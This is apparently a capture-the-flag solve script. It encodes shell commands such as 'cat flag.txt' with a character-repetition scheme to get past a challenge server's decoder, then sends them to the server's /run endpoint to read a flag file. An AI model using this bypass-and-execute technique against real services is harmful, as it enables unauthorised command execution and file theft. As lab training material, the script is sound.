#!/usr/bin/env python3
"""
Kohli Challenge - ACTUAL Solution
Based on the decode logic in the provided scripts
"""
import requests
import re

BASE_URL = "http://chall-bcaad8ca.evt-207.glabs.ctf7.com"

def expected_repeat(ascii_val, position):
    """Calculate expected repetition count for a character"""
    return ((ascii_val % 5) + 3) + (position % 3)

def encode_command(target_cmd):
    """
    Encode a command using the repetition pattern
    Each character needs to be repeated a specific number of times
    based on its ASCII value and position
    """
    encoded = ""
    position = 0
    
    for ch in target_cmd:
        ascii_val = ord(ch)
        repeat_count = expected_repeat(ascii_val, position)
        encoded += ch * repeat_count
        position += 1
    
    return encoded

def decode_locally(input_str):
    """Local decode to verify encoding"""
    groups = []
    i = 0
    while i < len(input_str):
        ch = input_str[i]
        count = 0
        while i < len(input_str) and input_str[i] == ch:
            count += 1
            i += 1
        groups.append((ch, count))
    
    output = ""
    position = 0
    for ch, count in groups:
        ascii_val = ord(ch)
        expected = expected_repeat(ascii_val, position)
        if count == expected:
            output += ch
            position += 1
        elif count > expected:
            output += ch + ch
            position += 2
    
    return output

def solve():
    print("="*80)
    print("KOHLI CHALLENGE - DECODE SOLUTION")
    print("="*80)
    
    # The target command to encode
    target = "cat flag.txt"
    
    print(f"\nTarget command: '{target}'")
    print(f"Encoding using repetition pattern...")
    
    # Encode the command
    encoded = encode_command(target)
    
    print(f"\nEncoded command: '{encoded}'")
    print(f"Encoded length: {len(encoded)} characters")
    
    # Verify locally
    decoded = decode_locally(encoded)
    print(f"\nLocal decode verification: '{decoded}'")
    print(f"Match: {decoded == target}")
    
    if decoded != target:
        print("\n⚠ WARNING: Local decode doesn't match target!")
        print("There may be an issue with the encoding logic")
        return None
    
    # Send to server
    print(f"\n{'='*80}")
    print("Sending encoded command to server...")
    print('='*80)
    
    try:
        r = requests.post(
            f"{BASE_URL}/run",
            json={"cmd": encoded},
            timeout=10
        )
        
        print(f"\nHTTP Status: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            output = data.get('output', '')
            
            print(f"Server response: {output}")
            
            # Check for flag
            if 'Kaal{' in output or 'FLAG{' in output:
                flag_match = re.search(r'Kaal\{[^}]+\}', output)
                if flag_match:
                    flag = flag_match.group(0)
                    print(f"\n{'='*80}")
                    print("🎉 SUCCESS! FLAG FOUND! 🎉")
                    print('='*80)
                    print(f"\nFLAG: {flag}")
                    print('='*80)
                    return flag
            else:
                print("\n⚠ No flag in response")
                print("The server may have decoded the command but not returned the flag")
        else:
            print(f"⚠ Unexpected status code: {r.status_code}")
            print(f"Response: {r.text}")
    
    except Exception as e:
        print(f"\n⚠ Error: {e}")
    
    return None

if __name__ == "__main__":
    flag = solve()
    
    if not flag:
        print("\n" + "="*80)
        print("Alternative commands to try:")
        print("="*80)
        
        alternatives = [
            "cat flag",
            "cat /flag",
            "cat /flag.txt",
            "flag",
            "getflag"
        ]
        
        for alt in alternatives:
            encoded = encode_command(alt)
            print(f"\n'{alt}' -> '{encoded}'")
